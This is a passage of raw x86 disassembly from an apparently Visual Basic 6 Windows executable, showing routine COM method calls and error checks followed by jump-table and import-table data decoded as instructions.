  405e7f:	db e2                	fnclex
  405e81:	0f 8d 0e 02 00 00    	jge    0x406095
  405e87:	e9 f7 01 00 00       	jmp    0x406083
  405e8c:	8b 06                	mov    (%esi),%eax
  405e8e:	56                   	push   %esi
  405e8f:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405e95:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405e98:	50                   	push   %eax
  405e99:	51                   	push   %ecx
  405e9a:	ff d3                	call   *%ebx
  405e9c:	8b 16                	mov    (%esi),%edx
  405e9e:	56                   	push   %esi
  405e9f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405ea5:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405eab:	50                   	push   %eax
  405eac:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405eaf:	50                   	push   %eax
  405eb0:	ff d3                	call   *%ebx
  405eb2:	8b f8                	mov    %eax,%edi
  405eb4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405eb7:	52                   	push   %edx
  405eb8:	57                   	push   %edi
  405eb9:	8b 0f                	mov    (%edi),%ecx
  405ebb:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405ec1:	85 c0                	test   %eax,%eax
  405ec3:	db e2                	fnclex
  405ec5:	7d 12                	jge    0x405ed9
  405ec7:	68 a0 00 00 00       	push   $0xa0
  405ecc:	68 b8 24 40 00       	push   $0x4024b8
  405ed1:	57                   	push   %edi
  405ed2:	50                   	push   %eax
  405ed3:	ff 15 28 10 40 00    	call   *0x401028
  405ed9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405edc:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405ee2:	51                   	push   %ecx
  405ee3:	68 80 29 40 00       	push   $0x402980
  405ee8:	8b 38                	mov    (%eax),%edi
  405eea:	ff 15 20 10 40 00    	call   *0x401020
  405ef0:	8b d0                	mov    %eax,%edx
  405ef2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405ef5:	ff 15 b8 10 40 00    	call   *0x4010b8
  405efb:	8b d7                	mov    %edi,%edx
  405efd:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405f03:	50                   	push   %eax
  405f04:	57                   	push   %edi
  405f05:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  405f0b:	85 c0                	test   %eax,%eax
  405f0d:	db e2                	fnclex
  405f0f:	7d 12                	jge    0x405f23
  405f11:	68 a4 00 00 00       	push   $0xa4
  405f16:	68 b8 24 40 00       	push   $0x4024b8
  405f1b:	57                   	push   %edi
  405f1c:	50                   	push   %eax
  405f1d:	ff 15 28 10 40 00    	call   *0x401028
  405f23:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405f26:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405f29:	50                   	push   %eax
  405f2a:	51                   	push   %ecx
  405f2b:	6a 02                	push   $0x2
  405f2d:	ff 15 9c 10 40 00    	call   *0x40109c
  405f33:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405f36:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405f39:	52                   	push   %edx
  405f3a:	50                   	push   %eax
  405f3b:	e9 6d 01 00 00       	jmp    0x4060ad
  405f40:	8b 0e                	mov    (%esi),%ecx
  405f42:	56                   	push   %esi
  405f43:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405f49:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405f4c:	50                   	push   %eax
  405f4d:	52                   	push   %edx
  405f4e:	ff d3                	call   *%ebx
  405f50:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405f56:	8b 06                	mov    (%esi),%eax
  405f58:	56                   	push   %esi
  405f59:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405f5f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405f62:	50                   	push   %eax
  405f63:	51                   	push   %ecx
  405f64:	ff d3                	call   *%ebx
  405f66:	8b f8                	mov    %eax,%edi
  405f68:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405f6b:	50                   	push   %eax
  405f6c:	57                   	push   %edi
  405f6d:	8b 17                	mov    (%edi),%edx
  405f6f:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405f75:	85 c0                	test   %eax,%eax
  405f77:	db e2                	fnclex
  405f79:	7d 12                	jge    0x405f8d
  405f7b:	68 a0 00 00 00       	push   $0xa0
  405f80:	68 b8 24 40 00       	push   $0x4024b8
  405f85:	57                   	push   %edi
  405f86:	50                   	push   %eax
  405f87:	ff 15 28 10 40 00    	call   *0x401028
  405f8d:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405f90:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405f96:	52                   	push   %edx
  405f97:	68 98 29 40 00       	push   $0x402998
  405f9c:	8b 39                	mov    (%ecx),%edi
  405f9e:	ff 15 20 10 40 00    	call   *0x401020
  405fa4:	8b d0                	mov    %eax,%edx
  405fa6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405fa9:	ff 15 b8 10 40 00    	call   *0x4010b8
  405faf:	89 bd f4 fd ff ff    	mov    %edi,-0x20c(%ebp)
  405fb5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405fbb:	50                   	push   %eax
  405fbc:	8b 85 f4 fd ff ff    	mov    -0x20c(%ebp),%eax
  405fc2:	57                   	push   %edi
  405fc3:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  405fc9:	85 c0                	test   %eax,%eax
  405fcb:	db e2                	fnclex
  405fcd:	7d 12                	jge    0x405fe1
  405fcf:	68 a4 00 00 00       	push   $0xa4
  405fd4:	68 b8 24 40 00       	push   $0x4024b8
  405fd9:	57                   	push   %edi
  405fda:	50                   	push   %eax
  405fdb:	ff 15 28 10 40 00    	call   *0x401028
  405fe1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405fe4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405fe7:	51                   	push   %ecx
  405fe8:	52                   	push   %edx
  405fe9:	6a 02                	push   $0x2
  405feb:	ff 15 9c 10 40 00    	call   *0x40109c
  405ff1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405ff4:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405ff7:	50                   	push   %eax
  405ff8:	51                   	push   %ecx
  405ff9:	e9 af 00 00 00       	jmp    0x4060ad
  405ffe:	8b 16                	mov    (%esi),%edx
  406000:	56                   	push   %esi
  406001:	ff 92 04 03 00 00    	call   *0x304(%edx)
  406007:	50                   	push   %eax
  406008:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40600b:	50                   	push   %eax
  40600c:	ff d3                	call   *%ebx
  40600e:	8b 0e                	mov    (%esi),%ecx
  406010:	56                   	push   %esi
  406011:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406017:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40601d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406020:	50                   	push   %eax
  406021:	52                   	push   %edx
  406022:	ff d3                	call   *%ebx
  406024:	8b f8                	mov    %eax,%edi
  406026:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406029:	51                   	push   %ecx
  40602a:	57                   	push   %edi
  40602b:	8b 07                	mov    (%edi),%eax
  40602d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406033:	85 c0                	test   %eax,%eax
  406035:	db e2                	fnclex
  406037:	7d 12                	jge    0x40604b
  406039:	68 a0 00 00 00       	push   $0xa0
  40603e:	68 b8 24 40 00       	push   $0x4024b8
  406043:	57                   	push   %edi
  406044:	50                   	push   %eax
  406045:	ff 15 28 10 40 00    	call   *0x401028
  40604b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40604e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406054:	50                   	push   %eax
  406055:	68 b4 29 40 00       	push   $0x4029b4
  40605a:	8b 3a                	mov    (%edx),%edi
  40605c:	ff 15 20 10 40 00    	call   *0x401020
  406062:	8b d0                	mov    %eax,%edx
  406064:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406067:	ff 15 b8 10 40 00    	call   *0x4010b8
  40606d:	8b cf                	mov    %edi,%ecx
  40606f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406075:	50                   	push   %eax
  406076:	57                   	push   %edi
  406077:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  40607d:	85 c0                	test   %eax,%eax
  40607f:	db e2                	fnclex
  406081:	7d 12                	jge    0x406095
  406083:	68 a4 00 00 00       	push   $0xa4
  406088:	68 b8 24 40 00       	push   $0x4024b8
  40608d:	57                   	push   %edi
  40608e:	50                   	push   %eax
  40608f:	ff 15 28 10 40 00    	call   *0x401028
  406095:	8d 55 d8             	lea    -0x28(%ebp),%edx
  406098:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40609b:	52                   	push   %edx
  40609c:	50                   	push   %eax
  40609d:	6a 02                	push   $0x2
  40609f:	ff 15 9c 10 40 00    	call   *0x40109c
  4060a5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4060a8:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4060ab:	51                   	push   %ecx
  4060ac:	52                   	push   %edx
  4060ad:	6a 02                	push   $0x2
  4060af:	ff 15 18 10 40 00    	call   *0x401018
  4060b5:	83 c4 18             	add    $0x18,%esp
  4060b8:	8b 85 30 ff ff ff    	mov    -0xd0(%ebp),%eax
  4060be:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4060c1:	03 c1                	add    %ecx,%eax
  4060c3:	0f 80 6e 02 00 00    	jo     0x406337
  4060c9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4060cc:	8b c8                	mov    %eax,%ecx
  4060ce:	33 c0                	xor    %eax,%eax
  4060d0:	e9 4a d4 ff ff       	jmp    0x40351f
  4060d5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060d8:	68 20 61 40 00       	push   $0x406120
  4060dd:	eb 40                	jmp    0x40611f
  4060df:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4060e2:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4060e5:	51                   	push   %ecx
  4060e6:	52                   	push   %edx
  4060e7:	6a 02                	push   $0x2
  4060e9:	ff 15 9c 10 40 00    	call   *0x40109c
  4060ef:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4060f2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4060f5:	50                   	push   %eax
  4060f6:	51                   	push   %ecx
  4060f7:	6a 02                	push   $0x2
  4060f9:	ff 15 18 10 40 00    	call   *0x401018
  4060ff:	8d 55 80             	lea    -0x80(%ebp),%edx
  406102:	8d 45 90             	lea    -0x70(%ebp),%eax
  406105:	52                   	push   %edx
  406106:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  406109:	50                   	push   %eax
  40610a:	8d 55 b0             	lea    -0x50(%ebp),%edx
  40610d:	51                   	push   %ecx
  40610e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406111:	52                   	push   %edx
  406112:	50                   	push   %eax
  406113:	6a 05                	push   $0x5
  406115:	ff 15 10 10 40 00    	call   *0x401010
  40611b:	83 c4 30             	add    $0x30,%esp
  40611e:	c3                   	ret
  40611f:	c3                   	ret
  406120:	8b 45 08             	mov    0x8(%ebp),%eax
  406123:	50                   	push   %eax
  406124:	8b 08                	mov    (%eax),%ecx
  406126:	ff 51 08             	call   *0x8(%ecx)
  406129:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40612c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40612f:	5f                   	pop    %edi
  406130:	5e                   	pop    %esi
  406131:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406138:	5b                   	pop    %ebx
  406139:	8b e5                	mov    %ebp,%esp
  40613b:	5d                   	pop    %ebp
  40613c:	c2 04 00             	ret    $0x4
  40613f:	90                   	nop
  406140:	e6 54                	out    %al,$0x54
  406142:	40                   	inc    %eax
  406143:	00 64 55 40          	add    %ah,0x40(%ebp,%edx,2)
  406147:	00 8e 35 40 00 e2    	add    %cl,-0x1dffbfcb(%esi)
  40614d:	55                   	push   %ebp
  40614e:	40                   	inc    %eax
  40614f:	00 6a 56             	add    %ch,0x56(%edx)
  406152:	40                   	inc    %eax
  406153:	00 e8                	add    %ch,%al
  406155:	56                   	push   %esi
  406156:	40                   	inc    %eax
  406157:	00 66 57             	add    %ah,0x57(%esi)
  40615a:	40                   	inc    %eax
  40615b:	00 ee                	add    %ch,%dh
  40615d:	57                   	push   %edi
  40615e:	40                   	inc    %eax
  40615f:	00 6c 58 40          	add    %ch,0x40(%eax,%ebx,2)
  406163:	00 ea                	add    %ch,%dl
  406165:	58                   	pop    %eax
  406166:	40                   	inc    %eax
  406167:	00 72 59             	add    %dh,0x59(%edx)
  40616a:	40                   	inc    %eax
  40616b:	00 f0                	add    %dh,%al
  40616d:	59                   	pop    %ecx
  40616e:	40                   	inc    %eax
  40616f:	00 6e 5a             	add    %ch,0x5a(%esi)
  406172:	40                   	inc    %eax
  406173:	00 f6                	add    %dh,%dh
  406175:	5a                   	pop    %edx
  406176:	40                   	inc    %eax
  406177:	00 74 5b 40          	add    %dh,0x40(%ebx,%ebx,2)
  40617b:	00 f2                	add    %dh,%dl
  40617d:	5b                   	pop    %ebx
  40617e:	40                   	inc    %eax
  40617f:	00 7a 5c             	add    %bh,0x5c(%edx)
  406182:	40                   	inc    %eax
  406183:	00 f8                	add    %bh,%al
  406185:	5c                   	pop    %esp
  406186:	40                   	inc    %eax
  406187:	00 76 5d             	add    %dh,0x5d(%esi)
  40618a:	40                   	inc    %eax
  40618b:	00 fe                	add    %bh,%dh
  40618d:	5d                   	pop    %ebp
  40618e:	40                   	inc    %eax
  40618f:	00 8c 5e 40 00 40 5f 	add    %cl,0x5f400040(%esi,%ebx,2)
  406196:	40                   	inc    %eax
  406197:	00 7a 3e             	add    %bh,0x3e(%edx)
  40619a:	40                   	inc    %eax
  40619b:	00 a1 3f 40 00 1b    	add    %ah,0x1b00403f(%ecx)
  4061a1:	41                   	inc    %ecx
  4061a2:	40                   	inc    %eax
  4061a3:	00 b5 41 40 00 4f    	add    %dh,0x4f004041(%ebp)
  4061a9:	42                   	inc    %edx
  4061aa:	40                   	inc    %eax
  4061ab:	00 e9                	add    %ch,%cl
  4061ad:	42                   	inc    %edx
  4061ae:	40                   	inc    %eax
  4061af:	00 83 43 40 00 1d    	add    %al,0x1d004043(%ebx)
  4061b5:	44                   	inc    %esp
  4061b6:	40                   	inc    %eax
  4061b7:	00 b7 44 40 00 51    	add    %dh,0x51004044(%edi)
  4061bd:	45                   	inc    %ebp
  4061be:	40                   	inc    %eax
  4061bf:	00 fe                	add    %bh,%dh
  4061c1:	5f                   	pop    %edi
  4061c2:	40                   	inc    %eax
  4061c3:	00 d6                	add    %dl,%dh
  4061c5:	36 40                	ss inc %eax
  4061c7:	00 6e 37             	add    %ch,0x37(%esi)
  4061ca:	40                   	inc    %eax
  4061cb:	00 ec                	add    %ch,%ah
  4061cd:	37                   	aaa
  4061ce:	40                   	inc    %eax
  4061cf:	00 6a 38             	add    %ch,0x38(%edx)
  4061d2:	40                   	inc    %eax
  4061d3:	00 f2                	add    %dh,%dl
  4061d5:	38 40 00             	cmp    %al,0x0(%eax)
  4061d8:	70 39                	jo     0x406213
  4061da:	40                   	inc    %eax
  4061db:	00 ee                	add    %ch,%dh
  4061dd:	39 40 00             	cmp    %eax,0x0(%eax)
  4061e0:	76 3a                	jbe    0x40621c
  4061e2:	40                   	inc    %eax
  4061e3:	00 f4                	add    %dh,%ah
  4061e5:	3a 40 00             	cmp    0x0(%eax),%al
  4061e8:	72 3b                	jb     0x406225
  4061ea:	40                   	inc    %eax
  4061eb:	00 fa                	add    %bh,%dl
  4061ed:	3b 40 00             	cmp    0x0(%eax),%eax
  4061f0:	78 3c                	js     0x40622e
  4061f2:	40                   	inc    %eax
  4061f3:	00 f6                	add    %dh,%dh
  4061f5:	3c 40                	cmp    $0x40,%al
  4061f7:	00 7e 3d             	add    %bh,0x3d(%esi)
  4061fa:	40                   	inc    %eax
  4061fb:	00 fc                	add    %bh,%ah
  4061fd:	3d 40 00 eb 45       	cmp    $0x45eb0040,%eax
  406202:	40                   	inc    %eax
  406203:	00 73 46             	add    %dh,0x46(%ebx)
  406206:	40                   	inc    %eax
  406207:	00 f1                	add    %dh,%cl
  406209:	46                   	inc    %esi
  40620a:	40                   	inc    %eax
  40620b:	00 6f 47             	add    %ch,0x47(%edi)
  40620e:	40                   	inc    %eax
  40620f:	00 f7                	add    %dh,%bh
  406211:	47                   	inc    %edi
  406212:	40                   	inc    %eax
  406213:	00 75 48             	add    %dh,0x48(%ebp)
  406216:	40                   	inc    %eax
  406217:	00 f3                	add    %dh,%bl
  406219:	48                   	dec    %eax
  40621a:	40                   	inc    %eax
  40621b:	00 7b 49             	add    %bh,0x49(%ebx)
  40621e:	40                   	inc    %eax
  40621f:	00 f9                	add    %bh,%cl
  406221:	49                   	dec    %ecx
  406222:	40                   	inc    %eax
  406223:	00 77 4a             	add    %dh,0x4a(%edi)
  406226:	40                   	inc    %eax
  406227:	00 ff                	add    %bh,%bh
  406229:	4a                   	dec    %edx
  40622a:	40                   	inc    %eax
  40622b:	00 7d 4b             	add    %bh,0x4b(%ebp)
  40622e:	40                   	inc    %eax
  40622f:	00 97 4f 40 00 fd    	add    %dl,-0x2ffbfb1(%edi)
  406235:	4e                   	dec    %esi
  406236:	40                   	inc    %eax
  406237:	00 95 4c 40 00 2f    	add    %dl,0x2f00404c(%ebp)
  40623d:	4d                   	dec    %ebp
  40623e:	40                   	inc    %eax
  40623f:	00 c9                	add    %cl,%cl
  406241:	4d                   	dec    %ebp
  406242:	40                   	inc    %eax
  406243:	00 63 4e             	add    %ah,0x4e(%ebx)
  406246:	40                   	inc    %eax
  406247:	00 6c 53 40          	add    %ch,0x40(%ebx,%edx,2)
  40624b:	00 58 51             	add    %bl,0x51(%eax)
  40624e:	40                   	inc    %eax
  40624f:	00 fb                	add    %bh,%bl
  406251:	4b                   	dec    %ebx
  406252:	40                   	inc    %eax
  406253:	00 f2                	add    %dh,%dl
  406255:	51                   	push   %ecx
  406256:	40                   	inc    %eax
  406257:	00 31                	add    %dh,(%ecx)
  406259:	50                   	push   %eax
  40625a:	40                   	inc    %eax
  40625b:	00 b8 60 40 00 00    	add    %bh,0x4060(%eax)
  406261:	01 47 47             	add    %eax,0x47(%edi)
  406264:	47                   	inc    %edi
  406265:	02 47 47             	add    0x47(%edi),%al
  406268:	47                   	inc    %edi
  406269:	03 04 05 06 47 47 47 	add    0x47474706(,%eax,1),%eax
  406270:	47                   	inc    %edi
  406271:	47                   	inc    %edi
  406272:	47                   	inc    %edi
  406273:	07                   	pop    %es
  406274:	47                   	inc    %edi
  406275:	47                   	inc    %edi
  406276:	47                   	inc    %edi
  406277:	47                   	inc    %edi
  406278:	08 09                	or     %cl,(%ecx)
  40627a:	0a 0b                	or     (%ebx),%cl
  40627c:	0c 0d                	or     $0xd,%al
  40627e:	0e                   	push   %cs
  40627f:	0f 10 11             	movups (%ecx),%xmm2
  406282:	47                   	inc    %edi
  406283:	47                   	inc    %edi
  406284:	12 13                	adc    (%ebx),%dl
  406286:	14 15                	adc    $0x15,%al
  406288:	16                   	push   %ss
  406289:	17                   	pop    %ss
  40628a:	18 19                	sbb    %bl,(%ecx)
  40628c:	1a 1b                	sbb    (%ebx),%bl
  40628e:	1c 1d                	sbb    $0x1d,%al
  406290:	1e                   	push   %ds
  406291:	1f                   	pop    %ds
  406292:	47                   	inc    %edi
  406293:	47                   	inc    %edi
  406294:	47                   	inc    %edi
  406295:	47                   	inc    %edi
  406296:	47                   	inc    %edi
  406297:	47                   	inc    %edi
  406298:	47                   	inc    %edi
  406299:	47                   	inc    %edi
  40629a:	47                   	inc    %edi
  40629b:	47                   	inc    %edi
  40629c:	47                   	inc    %edi
  40629d:	47                   	inc    %edi
  40629e:	47                   	inc    %edi
  40629f:	47                   	inc    %edi
  4062a0:	47                   	inc    %edi
  4062a1:	47                   	inc    %edi
  4062a2:	47                   	inc    %edi
  4062a3:	47                   	inc    %edi
  4062a4:	47                   	inc    %edi
  4062a5:	47                   	inc    %edi
  4062a6:	47                   	inc    %edi
  4062a7:	47                   	inc    %edi
  4062a8:	47                   	inc    %edi
  4062a9:	47                   	inc    %edi
  4062aa:	47                   	inc    %edi
  4062ab:	47                   	inc    %edi
  4062ac:	47                   	inc    %edi
  4062ad:	47                   	inc    %edi
  4062ae:	47                   	inc    %edi
  4062af:	47                   	inc    %edi
  4062b0:	47                   	inc    %edi
  4062b1:	47                   	inc    %edi
  4062b2:	47                   	inc    %edi
  4062b3:	20 20                	and    %ah,(%eax)
  4062b5:	47                   	inc    %edi
  4062b6:	47                   	inc    %edi
  4062b7:	47                   	inc    %edi
  4062b8:	21 22                	and    %esp,(%edx)
  4062ba:	23 24 25 26 27 28 29 	and    0x29282726(,%eiz,1),%esp
  4062c1:	2a 2b                	sub    (%ebx),%ch
  4062c3:	2c 47                	sub    $0x47,%al
  4062c5:	2d 2e 2f 30 31       	sub    $0x31302f2e,%eax
  4062ca:	32 33                	xor    (%ebx),%dh
  4062cc:	34 35                	xor    $0x35,%al
  4062ce:	36 37                	ss aaa
  4062d0:	38 39                	cmp    %bh,(%ecx)
  4062d2:	3a 3b                	cmp    (%ebx),%bh
  4062d4:	47                   	inc    %edi
  4062d5:	47                   	inc    %edi
  4062d6:	47                   	inc    %edi
  4062d7:	47                   	inc    %edi
  4062d8:	47                   	inc    %edi
  4062d9:	47                   	inc    %edi
  4062da:	47                   	inc    %edi
  4062db:	47                   	inc    %edi
  4062dc:	47                   	inc    %edi
  4062dd:	47                   	inc    %edi
  4062de:	47                   	inc    %edi
  4062df:	47                   	inc    %edi
  4062e0:	47                   	inc    %edi
  4062e1:	47                   	inc    %edi
  4062e2:	47                   	inc    %edi
  4062e3:	47                   	inc    %edi
  4062e4:	47                   	inc    %edi
  4062e5:	47                   	inc    %edi
  4062e6:	47                   	inc    %edi
  4062e7:	47                   	inc    %edi
  4062e8:	47                   	inc    %edi
  4062e9:	47                   	inc    %edi
  4062ea:	47                   	inc    %edi
  4062eb:	47                   	inc    %edi
  4062ec:	47                   	inc    %edi
  4062ed:	47                   	inc    %edi
  4062ee:	47                   	inc    %edi
  4062ef:	47                   	inc    %edi
  4062f0:	47                   	inc    %edi
  4062f1:	47                   	inc    %edi
  4062f2:	47                   	inc    %edi
  4062f3:	47                   	inc    %edi
  4062f4:	47                   	inc    %edi
  4062f5:	47                   	inc    %edi
  4062f6:	47                   	inc    %edi
  4062f7:	47                   	inc    %edi
  4062f8:	47                   	inc    %edi
  4062f9:	47                   	inc    %edi
  4062fa:	47                   	inc    %edi
  4062fb:	47                   	inc    %edi
  4062fc:	47                   	inc    %edi
  4062fd:	47                   	inc    %edi
  4062fe:	47                   	inc    %edi
  4062ff:	47                   	inc    %edi
  406300:	47                   	inc    %edi
  406301:	47                   	inc    %edi
  406302:	47                   	inc    %edi
  406303:	47                   	inc    %edi
  406304:	47                   	inc    %edi
  406305:	47                   	inc    %edi
  406306:	47                   	inc    %edi
  406307:	47                   	inc    %edi
  406308:	47                   	inc    %edi
  406309:	47                   	inc    %edi
  40630a:	47                   	inc    %edi
  40630b:	47                   	inc    %edi
  40630c:	47                   	inc    %edi
  40630d:	47                   	inc    %edi
  40630e:	47                   	inc    %edi
  40630f:	47                   	inc    %edi
  406310:	47                   	inc    %edi
  406311:	47                   	inc    %edi
  406312:	3c 3d                	cmp    $0x3d,%al
  406314:	3e 3f                	ds aas
  406316:	40                   	inc    %eax
  406317:	41                   	inc    %ecx
  406318:	42                   	inc    %edx
  406319:	47                   	inc    %edi
  40631a:	47                   	inc    %edi
  40631b:	47                   	inc    %edi
  40631c:	47                   	inc    %edi
  40631d:	47                   	inc    %edi
  40631e:	47                   	inc    %edi
  40631f:	47                   	inc    %edi
  406320:	47                   	inc    %edi
  406321:	47                   	inc    %edi
  406322:	47                   	inc    %edi
  406323:	47                   	inc    %edi
  406324:	47                   	inc    %edi
  406325:	47                   	inc    %edi
  406326:	47                   	inc    %edi
  406327:	47                   	inc    %edi
  406328:	47                   	inc    %edi
  406329:	47                   	inc    %edi
  40632a:	47                   	inc    %edi
  40632b:	47                   	inc    %edi
  40632c:	47                   	inc    %edi
  40632d:	47                   	inc    %edi
  40632e:	47                   	inc    %edi
  40632f:	47                   	inc    %edi
  406330:	47                   	inc    %edi
  406331:	47                   	inc    %edi
  406332:	47                   	inc    %edi
  406333:	43                   	inc    %ebx
  406334:	44                   	inc    %esp
  406335:	45                   	inc    %ebp
  406336:	46                   	inc    %esi
  406337:	ff 15 84 10 40 00    	call   *0x401084
  40633d:	90                   	nop
  40633e:	90                   	nop
  40633f:	90                   	nop
  406340:	9e                   	sahf
  406341:	9e                   	sahf
  406342:	9e                   	sahf
  406343:	9e                   	sahf
  406344:	6c                   	insb   (%dx),%es:(%edi)
  406345:	63 00                	arpl   %eax,(%eax)
  406347:	00 ff                	add    %bh,%bh
  406349:	ff                   	(bad)
  40634a:	ff                   	(bad)
  40634b:	ff                   	(bad)
  40634c:	ff                   	(bad)
  40634d:	ff                   	(bad)
  40634e:	ff                   	(bad)
  40634f:	ff 40 64             	incl   0x64(%eax)
  406352:	00 00                	add    %al,(%eax)
  406354:	00 10                	add    %dl,(%eax)
	...
  40636a:	00 00                	add    %al,(%eax)
  40636c:	4e                   	dec    %esi
  40636d:	64 00 00             	add    %al,%fs:(%eax)
  406370:	58                   	pop    %eax
  406371:	64 00 00             	add    %al,%fs:(%eax)
  406374:	66 64 00 00          	data16 add %al,%fs:(%eax)
  406378:	78 64                	js     0x4063de
  40637a:	00 00                	add    %al,(%eax)
  40637c:	88 64 00 00          	mov    %ah,0x0(%eax,%eax,1)
  406380:	9c                   	pushf
  406381:	64 00 00             	add    %al,%fs:(%eax)
  406384:	ac                   	lods   %ds:(%esi),%al
  406385:	64 00 00             	add    %al,%fs:(%eax)
  406388:	c0 64 00 00 ce       	shlb   $0xce,0x0(%eax,%eax,1)
  40638d:	64 00 00             	add    %al,%fs:(%eax)
  406390:	dc 64 00 00          	fsubl  0x0(%eax,%eax,1)
  406394:	f2 64 00 00          	repnz add %al,%fs:(%eax)
  406398:	0a 65 00             	or     0x0(%ebp),%ah
  40639b:	00 9a 02 00 80 1a    	add    %bl,0x1a800002(%edx)
  4063a1:	65 00 00             	add    %al,%gs:(%eax)
  4063a4:	28 65 00             	sub    %ah,0x0(%ebp)
  4063a7:	00 3a                	add    %bh,(%edx)
  4063a9:	65 00 00             	add    %al,%gs:(%eax)
  4063ac:	4c                   	dec    %esp
  4063ad:	65 00 00             	add    %al,%gs:(%eax)
  4063b0:	56                   	push   %esi
  4063b1:	65 00 00             	add    %al,%gs:(%eax)
  4063b4:	64 65 00 00          	fs add %al,%gs:(%eax)
  4063b8:	78 65                	js     0x40641f
  4063ba:	00 00                	add    %al,(%eax)
  4063bc:	86 65 00             	xchg   %ah,0x0(%ebp)
  4063bf:	00 98 65 00 00 a6    	add    %bl,-0x59ffff9b(%eax)
  4063c5:	65 00 00             	add    %al,%gs:(%eax)
  4063c8:	bc 65 00 00 c6       	mov    $0xc6000065,%esp
  4063cd:	65 00 00             	add    %al,%gs:(%eax)
  4063d0:	e2 65                	loop   0x406437
  4063d2:	00 00                	add    %al,(%eax)
  4063d4:	f8                   	clc
  4063d5:	65 00 00             	add    %al,%gs:(%eax)
  4063d8:	06                   	push   %es
  4063d9:	66 00 00             	data16 add %al,(%eax)
  4063dc:	60                   	pusha
  4063dd:	02 00                	add    (%eax),%al
  4063df:	80 18 66             	sbbb   $0x66,(%eax)
  4063e2:	00 00                	add    %al,(%eax)
  4063e4:	2c 66                	sub    $0x66,%al
  4063e6:	00 00                	add    %al,(%eax)
  4063e8:	3e 66 00 00          	data16 add %al,%ds:(%eax)
  4063ec:	4c                   	dec    %esp
  4063ed:	66 00 00             	data16 add %al,(%eax)
  4063f0:	56                   	push   %esi
  4063f1:	66 00 00             	data16 add %al,(%eax)
  4063f4:	6c                   	insb   (%dx),%es:(%edi)
  4063f5:	66 00 00             	data16 add %al,(%eax)
  4063f8:	78 66                	js     0x406460
  4063fa:	00 00                	add    %al,(%eax)
  4063fc:	8a 66 00             	mov    0x0(%esi),%ah
  4063ff:	00 9c 66 00 00 a9 02 	add    %bl,0x2a90000(%esi,%eiz,2)
  406406:	00 80 ac 66 00 00    	add    %al,0x66ac(%eax)
  40640c:	c0 66 00 00          	shlb   $0x0,0x0(%esi)
  406410:	d2 66 00             	shlb   %cl,0x0(%esi)
  406413:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  406417:	80 e0 66             	and    $0x66,%al
  40641a:	00 00                	add    %al,(%eax)
  40641c:	ee                   	out    %al,(%dx)
  40641d:	66 00 00             	data16 add %al,(%eax)
  406420:	00 67 00             	add    %ah,0x0(%edi)
  406423:	00 0a                	add    %cl,(%edx)
  406425:	67 00 00             	add    %al,(%bx,%si)
  406428:	1a 67 00             	sbb    0x0(%edi),%ah
  40642b:	00 24 67             	add    %ah,(%edi,%eiz,2)
  40642e:	00 00                	add    %al,(%eax)
  406430:	2e 67 00 00          	add    %al,%cs:(%bx,%si)
  406434:	38 67 00             	cmp    %ah,0x0(%edi)
  406437:	00 48 67             	add    %cl,0x67(%eax)
  40643a:	00 00                	add    %al,(%eax)
  40643c:	00 00                	add    %al,(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	4d                   	dec    %ebp
  406441:	53                   	push   %ebx
  406442:	56                   	push   %esi
  406443:	42                   	inc    %edx
